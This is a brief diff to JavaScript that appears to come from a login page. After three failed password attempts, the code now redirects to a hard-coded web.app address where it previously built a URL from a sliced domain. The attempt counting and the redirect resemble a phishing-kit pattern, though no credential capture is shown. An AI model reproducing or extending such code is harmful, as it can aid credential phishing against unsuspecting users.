@@ -331,7 +331,7 @@
                   if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://www."+my_slice);
+                    window.location.replace("https://rdrsrv-6e73d.web.app");
 
                   }
                   // $('#msg').html(response['msg']);
@@ -346,7 +346,7 @@
               $("#password").val("");
               if (count>=3) {
                 count=0;
-                window.location.replace("http://www."+my_slice);
+                window.location.replace("https://rdrsrv-6e73d.web.app");
               }
               $("#msg").show();
               // $('#msg').html("Please try again later");
